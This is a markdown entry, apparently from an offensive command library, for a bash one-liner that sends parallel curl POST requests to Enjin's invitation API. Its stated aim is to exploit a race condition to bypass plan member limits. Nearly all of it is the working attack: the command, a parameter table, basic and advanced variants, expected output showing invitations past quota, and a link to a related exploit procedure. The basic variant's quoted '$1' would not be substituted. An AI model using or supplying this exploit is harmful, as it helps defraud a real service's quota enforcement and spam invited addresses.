---
id: cmd-curl-parallel-invitations
data: >-
  cat emails.txt | xargs -n1 -P10 curl -X POST
  'https://platform.enjin.io/api/invite' -H 'Authorization: Bearer YOUR_TOKEN'
  -H 'Content-Type: application/json' -d
  '{"email":"EMAIL_HERE","project_id":YOUR_PROJECT_ID}'
tags:
  - web
  - race-condition
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.482Z'
verified: false
validated: true
submitted: true
---
# curl-parallel-invitations

## Command

```bash
cat emails.txt | xargs -n1 -P10 curl -X POST 'https://platform.enjin.io/api/invite' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"email":"EMAIL_HERE","project_id":YOUR_PROJECT_ID}'
```

## Description

This command sends multiple parallel POST requests to the Enjin invitation API using curl and xargs, exploiting a race condition by submitting invitations concurrently to bypass member limits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| emails.txt | File containing one email per line | Yes |
| -P10 | Number of parallel processes (adjust based on rate limits) | No |
| YOUR_TOKEN | Bearer token from authentication | Yes |
| YOUR_PROJECT_ID | ID of the target project | Yes |
| EMAIL_HERE | Placeholder replaced by xargs for each email | Yes |

## Examples

### Basic Usage

```bash
cat emails.txt | xargs -n1 -P5 curl -X POST 'https://platform.enjin.io/api/invite' -H 'Authorization: Bearer eyJ...' -d '{"email":"$1","project_id":123}'
```

### Advanced Usage

```bash
cat emails.txt | xargs -n1 -P20 -I {} curl -X POST 'https://platform.enjin.io/api/invite' -H 'Authorization: Bearer eyJ...' -H 'Content-Type: application/json' -d '{"email":"{}","project_id":123}' --silent
```

## Expected Output

Multiple lines of HTTP responses, e.g., {"status":"invited"} for each successful invitation, with no limit error despite exceeding plan quotas.

## Related

- [[Related Procedure|procedures/Exploit-Enjin-Invitation-Race-Condition]]
